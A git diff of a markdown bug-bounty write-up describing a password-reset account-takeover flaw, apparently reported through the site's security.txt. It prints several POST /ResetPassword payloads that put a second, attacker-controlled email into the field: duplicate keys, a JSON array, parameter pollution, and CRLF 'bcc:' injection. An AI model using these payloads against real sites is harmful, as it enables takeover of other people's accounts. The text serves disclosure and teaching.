@@ -31,6 +31,7 @@ POST /ResetPassword
 	"email" : "myemail1@email.com",
        "email" : "myemail2@email.com"
 }
+
 ```
 
 And of course its failed only reset token sent to myemail1 account not myemail2 account.
@@ -47,6 +48,7 @@ POST /ResetPassword
 {
 	"email" : "myeamil1@email.com%20myemail2@email.com"
 }
+
 ```
 
 ```bash
@@ -58,19 +60,30 @@ POST /ResetPassword
 {
 	"email" : "myemail1@email.com%20cc:myemail2@email.com"
 }
+
 ```
 
 #### One Last Ride...
 Ok, thats it I was ready to give up but I remember one blog post that I read, it mentioned you can use **JSON Table** That will help you to send set of elements in array so, I give it a try luckily It sent password reset link to my attacker account and I can able to reset victim's account.
 
-![nofinal](https://user-images.githubusercontent.com/106372696/171010957-5694d6ff-aa51-434e-a6c4-8cd31e005200.png)
+```bash
+POST /Resetpassword
 
+...
+...
+
+{
+	"email" : ["myemail1@email.com","myemail2@email.com"]
+}
+
+```
 
 Then I decided to send the report to their security team, but they don't have VDP or RDP on any crowdsource platform like Hackerone or Bugcrowd.So, I search **security.txt**(RFC 9116) and find their security team email that tells me where I should report related to security issues. I sent my finds and they reward me through btc (they don't hall of fame :( ).
 
 	Note: You can find security.txt by https://www.website.com/.well-known/security.txt
 	
 #### Other methods to check password related issues:
+
 ```bash
 POST /ResetPassword
 
@@ -78,6 +91,7 @@ POST /ResetPassword
 ...
 
 email="victim@email.com&email=attacker@email.com"
+
 ```
 
 ```bash
@@ -87,6 +101,7 @@ POST /ResetPassword
 ...
 
 email="victim@email.com%20email=attacker@email.com"
+
 ```
 
 ```bash
@@ -96,6 +111,7 @@ POST /ResetPassword
 ...
 
 email="victim@email.com|email=attacker@email.com" 
+
 ```
 
 ```bash
@@ -105,6 +121,7 @@ POST /ResetPassword
 ...
 
 email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"  
+
 ```
 
 I don't do bug bounties but this one I accidently try my luck and got success..Thanks for Reading this article. I hope you all enjoy this one. cheers :)
